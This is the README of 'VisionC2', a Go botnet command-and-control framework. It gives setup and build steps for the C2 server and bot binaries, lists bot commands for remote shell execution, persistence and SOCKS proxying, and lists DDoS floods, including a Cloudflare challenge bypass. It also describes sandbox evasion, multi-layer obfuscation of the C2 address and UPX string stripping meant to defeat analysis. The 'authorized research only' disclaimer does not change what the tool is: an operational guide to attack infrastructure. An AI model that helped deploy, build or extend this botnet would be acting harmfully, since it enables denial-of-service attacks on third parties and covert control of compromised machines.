# VisionC2 – Advanced Botnet Command & Control Framework

![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
![Go Version](https://img.shields.io/badge/Go-1.23.0+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
![License](https://img.shields.io/badge/License-MIT-yellow)

**VisionC2** is an advanced botnet framework built in Go focused on network stress testing. Features end-to-end TLS 1.3 encryption, anti-analysis techniques, and DDOS/RCE/SOCKS modules.


## 🚀 Installation & Setup

### Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3
# Go 1.23+ required - see https://go.dev/dl/
```

### ⭐ Use the Setup Wizard (Recommended)

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```

> 💡 **Don't waste time with manual setup** - the wizard does it all in under 2 minutes!

---

```
╔══════════════════════════════════════════════════════════╗
║              Select Setup Mode                           ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  [1] Full Setup                                          ║
║      New C2 address, magic code, certs, everything       ║
║      Use for: Fresh install or complete rebuild          ║
║                                                          ║
║  [2] C2 URL Update Only                                  ║
║      Change C2 domain/IP, keep magic code & certs        ║
║      Use for: Server migration, domain change            ║
║                                                          ║
║  [0] Exit                                                ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
➜ Select option [1]: 1
[i] Starting Full Setup...

╔══════════════════════════════════════════════════════════╗
║ Step 1/5: C2 Server Configuration                        ║
╚══════════════════════════════════════════════════════════╝

➜ Enter C2 server IP/domain [127.0.0.1]: c2.domain.com
➜ Enter admin server port [420]: 200
[✓] C2 configured: c2.domain.com:443
[✓] Admin port: 200
[i] Bot connection port is fixed at 443 (TLS)

╔══════════════════════════════════════════════════════════╗
║ Step 2/5: Security Token Generation                      ║
╚══════════════════════════════════════════════════════════╝

[i] Auto-generated Magic Code: 9rOKxDR%EV&90*X%
[i] Auto-generated Protocol Version: V3_3
[i] Auto-generated Crypt Seed: 3c841808

? Use auto-generated security tokens? [Y/n]: y
[i] Applying multi-layer obfuscation...
[✓] C2 address obfuscation verified ✓

╔══════════════════════════════════════════════════════════╗
║ Step 3/5: TLS Certificate Generation                     ║
╚══════════════════════════════════════════════════════════╝

[i] Certificate details (press Enter for defaults):

➜ Country code (2 letter) [US]: US
➜ State/Province [California]: California
➜ City [San Francisco]: San Francisco
➜ Organization [Security Research]: Sec Team
➜ Common Name (domain) [c2.domain.com]: 
➜ Valid days [365]: 360
[i] Generating 4096-bit RSA private key...
[i] Generating self-signed certificate...
[✓] TLS certificates generated successfully

╔══════════════════════════════════════════════════════════╗
║ Step 4/5: Updating Source Code                           ║
╚══════════════════════════════════════════════════════════╝

[i] Updating cnc/main.go...
[✓] CNC configuration updated
[i] Updating bot/main.go...
[✓] Bot configuration updated

╔══════════════════════════════════════════════════════════╗
║ Step 5/5: Building Binaries                              ║
╚══════════════════════════════════════════════════════════╝

? Build CNC server? [Y/n]: y
[i] Building CNC server...
[✓] CNC server built successfully
? Build bot binaries (14 architectures)? [Y/n]: y
[!] This will take several minutes...
[i] Building bot binaries for 14 architectures...
[i] This may take a few minutes...
```

**That's it!** The wizard handles everything:

- C2 address configuration & obfuscation
- Random magic codes & protocol versions  
- TLS certificate generation
- Source code updates
- Building CNC + 14 bot architectures

## 🎯 Quick Usage

```bash
# Start server
cd cnc && ./cnc

# Connect admin (in another terminal)
nc YOUR_IP YOUR_ADMIN_PORT
# Type "spamtec" → login prompt appears

# Bot binaries ready in: bot/bins/
optional: protect UPX packed binaries from string analysis https://github.com/Syn2Much/upx-stripper
```

---

## 📋 Changelog

### v3.2 - January 29, 2026

#### 🚀 New Features

- **HTTPS/TLS Flood Attack** (`!https`, `!tls`) - High-performance TLS 1.3 flood with HTTP/2 fingerprinting, random SNI, and proper handshake completion
- **Cloudflare Bypass Attack** (`!cfbypass`) - Bypasses Cloudflare UAM challenge with JavaScript execution simulation, cookie persistence, and proper browser fingerprinting
- **DNS TXT Record C2 Lookup** - Bot can resolve C2 address from DNS TXT records for domain-fronting style obfuscation; falls back to Cloudflare DoH if system DNS fails
- **Setup Menu System** - `setup.py` now offers two modes:
  - `[1] Full Setup` - Fresh install with new magic code, certs, everything
  - `[2] C2 URL Update Only` - Change domain while keeping existing magic code & certs (for server migration)

#### 🛡️ Security Enhancements

- **Multi-Layer Obfuscation** - Upgraded from simple XOR+Base64 to 4-layer encryption:
  - Layer 1: Base64 decode
  - Layer 2: XOR with derived key (SHA256 of cryptSeed)
  - Layer 3: RC4 stream cipher decryption
  - Layer 4: Byte substitution reversal with MD5 checksum verification
- **CryptSeed Generation** - Random 32-char seed generated per deployment for unique obfuscation keys
- **Obfuscation Verification** - Setup wizard verifies encode/decode cycle before deployment

#### 🔧 Bug Fixes

- **Fixed SOCKS5 Proxy** - Corrected buffer sizes, added proper timeouts, fixed TCP half-close handling
- **Fixed Target Resolution** - All attack methods (SYN, ACK, GRE, DNS, UDP, TCP) now resolve hostnames via `resolveTarget()` - URLs work as targets
- **Fixed DNS Resolution** - Added system DNS with Cloudflare DoH fallback for reliable target resolution
- **Fixed EOF spam in C2 logs** - Removed noisy `println(err.Error())` calls that flooded logs
- **Fixed Ctrl+C handling** - Added proper telnet negotiation (IAC WILL ECHO, WILL SGA, WONT LINEMODE)
- **Fixed PuTTY terminal glitches** - Telnet protocol negotiation properly configures terminal mode
- **Fixed connection cleanup** - Added `defer conn.Close()` for proper resource cleanup
- **Fixed buffered reader issues** - Single `bufio.Reader` per connection instead of new ones each loop

#### ✨ Improvements

- **Redesigned help menu** - Fixed alignment, 64-character width box, added new attack commands
- **New intricate banner** - Complete redesign with gradient ASCII art and live stats
- **Silent error handling** - No information leakage via logs on disconnect

---

### v3.1 - January 2026

#### 🔧 Initial Fixes

- Basic telnet negotiation
- Help menu alignment
- Banner redesign

---

## 🏗️ Architecture Overview

VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:

```
┌─────────────────┐    TLS 1.3    ┌─────────────────┐
│   Admin Console │◄──────────────►│    C2 Server    │
│  (Multi-User)   │                │  (Go Backend)   │
└─────────────────┘                └─────────────────┘
                                         │ TLS 1.3
                                         ▼
┌─────────────────┐                ┌─────────────────┐
│   Bot Agents    │◄───────────────┤  Bot Registry   │
│ (14+ Architectures)│                │ & Management   │
└─────────────────┘                └─────────────────┘
```

---

## 🛠️ Command Reference

### User Management

- `help` - Context-aware help system (shows available commands)
- `db` - User database management (Owner only)
- `private` - Specialized commands based on clearance level

### Bot Operations

- `bots` - List all active agents with detailed status
- `!<botid> <command>` - Target specific agent
- `!info` - Comprehensive system intelligence
- `!persist` - Enhanced persistence mechanisms
- `!reinstall` - Agent redeployment
- `!lolnogtfo` - Secure agent removal

### Network Operations  

- `!socks <port>` - Establish SOCKS5 reverse proxy
- `!stopsocks` - Terminate proxy connections
- `!shell <command>` - Secure remote execution
- `!detach <command>` - Background process execution
- `!stream <command>` - Real-time output streaming

### Stress Testing

- `!udpflood <ip> <port> <duration>`
- `!tcpflood <ip> <port> <duration>`
- `!http <url/ip> <port> <duration>`
- `!https <url> <duration>` - TLS 1.3 flood with HTTP/2 fingerprinting
- `!tls <url> <duration>` - Alias for HTTPS flood
- `!cfbypass <url> <duration>` - Cloudflare UAM bypass attack
- `!syn/!ack/!gre/!dns` - Protocol-specific attacks

---

## 🔐 Security

- **TLS 1.3**: Encrypted communications for all network traffic
- **HMAC challenge-response auth**: Secure authentication mechanism
- **Multi-Layer C2 Obfuscation**: RC4 + XOR + byte substitution + MD5 checksum verification
- **DNS TXT Record Lookups**: C2 address can be hidden in DNS TXT records with DoH fallback
- **UPX compressed binaries**: Executable compression and protection
- **Multi-tier user roles**: Granular access control system

### 🛡️ **Advanced Anti-Detection**

- **Sandbox Evasion**: Multi-stage detection of virtualized environments
- **String Obfuscation**: Critical strings are hidden from static analysis
- **Binary Protection**: UPX compression with string removal techniques
- **Unique Crypt Seeds**: Each deployment gets unique obfuscation keys
- **Bot Killer/Watchdog**: (WIP)

---

## ⚖️ Disclaimer

**Authorized security research only.** Obtain written permission before use. The developers assume no liability and are not responsible for any misuse or damage caused by this program.

---

## 🤝 Community & Support

### Contributing

We welcome contributions from security professionals:

- Code improvements and optimizations
- Additional evasion techniques
- Enhanced security features
- Documentation and examples

### Acknowledgments

Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo

📧 **Contact**: [dev@sinners.city](mailto:dev@sinners.city)

---
